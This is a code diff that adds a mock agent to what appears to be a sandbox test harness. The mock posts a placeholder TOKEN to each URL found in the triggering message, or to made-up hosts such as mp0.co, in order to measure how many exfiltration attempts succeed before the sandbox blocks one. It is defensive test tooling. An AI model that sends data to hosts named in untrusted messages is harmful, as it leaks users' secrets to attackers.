@@ -60,3 +60,49 @@ class MockCompliantAgent:
 
     def restore_state(self, snapshot) -> None:
         self._n = int((snapshot or {}).get("data", {}).get("n", 1))
+
+
+class MockMultipostAgent:
+    """Posts TOKEN to up to n_posts distinct hosts, one per hop, until n_posts succeed.
+
+    The R3 throughput stand-in. Under the sandbox's break-on-deny loop a denied post
+    ends the interaction, so the agent is only re-invoked after a SUCCESS — counting
+    ToolResultEvents since the last user message therefore equals the successful-post
+    count, and the successful posts form a geometric run truncated at the first block.
+    n_posts=1 reduces to MockCompliantAgent. Hosts come from the URLs in the triggering
+    message (the forge family enumerates them); missing ones are synthesized distinct.
+    """
+
+    def __init__(self, n_posts: int = 8) -> None:
+        self._n_posts = max(1, int(n_posts))
+
+    def next_action(self, *, history, tools):
+        del tools
+        events = list(history.events)
+        posts_done = 0
+        last_user = ""
+        for e in reversed(events):
+            if isinstance(e, ToolResultEvent):
+                posts_done += 1
+            elif isinstance(e, UserMessageEvent):
+                last_user = e.text
+                break
+        if posts_done >= self._n_posts:
+            return FinalResponseDecision(text="done")
+        urls = [m.rstrip('.,!?)"\'') for m in URL_RE.findall(last_user or "")]
+        url = urls[posts_done] if posts_done < len(urls) else f"http://mp{posts_done}.co"
+        call = ToolCall(
+            call_id=f"call_{posts_done:06d}",
+            tool_name="http.post",
+            arguments={"url": url, "data": TOKEN},
+        )
+        return ToolCallDecision(call=call, assistant_message=None)
+
+    def reset_state(self) -> None:
+        return None
+
+    def snapshot_state(self):
+        return {"version": 1, "backend": "mock-multi", "data": {"n_posts": self._n_posts}}
+
+    def restore_state(self, snapshot) -> None:
+        return None
